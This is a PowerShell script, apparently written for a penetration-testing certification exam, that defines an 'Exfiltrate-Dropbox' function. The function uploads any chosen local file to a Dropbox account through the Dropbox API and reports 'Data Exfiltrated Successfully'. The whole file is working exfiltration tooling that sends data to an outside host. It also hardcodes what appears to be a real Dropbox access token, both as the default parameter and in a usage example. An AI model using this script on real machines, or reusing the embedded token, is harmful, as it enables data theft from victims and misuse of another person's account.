function Exfiltrate-Dropbox
{
    <#

    .SYNOPSIS
    A PowerShell script that exfiltrate file to Dropbox

    .DESCRIPTION
    A PowerShell script that upload file from local machine to Dropbox using the API
 
     .PARAMTER Token
    It expects an access token of your Dropbox account, Or you could change the token inside the code.
    https://blogs.dropbox.com/developers/2014/05/generate-an-access-token-for-your-own-account/

    .PARAMTER LocalFilePath
    The File you want to exfiltrate to your Dropbox account.

    .PARAMTER RemoteFilePath
    Path of the file you want to exfiltrate inside your Dropbox account.

    .EXAMPLE
    PS C:\> . .\Exfiltrate-Dropbox.ps1
    PS C:\> Exfiltrate-Dropbox -LocalFilePath .\test.txt -RemoteFilePath "/test-uploaded.txt"
    PS C:\> Exfiltrate-Dropbox -LocalFilePath .\test.txt -RemoteFilePath "/test-uploaded.txt" -Token "oea-uClDJ0AAAAAAAAAAC6Q8S94-xHeBb2-hLr_6oH_LruhhuuFJ1mrb6PnQMrXJ"
    PS C:\> ".\test.txt" | Exfiltrate-Dropbox -RemoteFilePath "/test-uploaded.txt"


    .LINK
    https://blogs.dropbox.com/developers/2014/05/generate-an-access-token-for-your-own-account/

    .NOTES
    This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam.
    " http://www.securitytube-training.com/online-courses/powershell-for-pentesters/ "
    Student ID: PSP - 3224
    #>

    [CmdletBinding(SupportsShouldProcess = $true)]
    param (

    [parameter (Mandatory = $false)]
    [string]
    $Token = "oea-uClDJ0AAAAAAAAAAC7Q8S94-xHeBb2-hLr_9oH_LruhhuuFJ1mrb1PnQMrXJ",

    [parameter (Mandatory = $true ,ValueFromPipeline = $true)]
    [string]
    $LocalFilePath,

    [parameter (Mandatory = $true)]
    [string]
    $RemoteFilePath

    )



    $Header= @{
        "Dropbox-API-Arg"='{"path": "'+ $RemoteFilePath +'","mode": "add","autorename": true,"mute": false,"strict_conflict": false}'
        "Authorization"="Bearer $Token"
        "Content-Type"="application/octet-stream"
    } 
    
    try {
        $req = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $LocalFilePath -Headers $Header
        if ($req){
         Write-Host "`n[+] Data Exfiltrated Successfully`n" -ForegroundColor Green 
               }
     }
    catch { 
         Write-Host "`n[-] Something Went Wrong`n" -ForegroundColor Red
          }
}

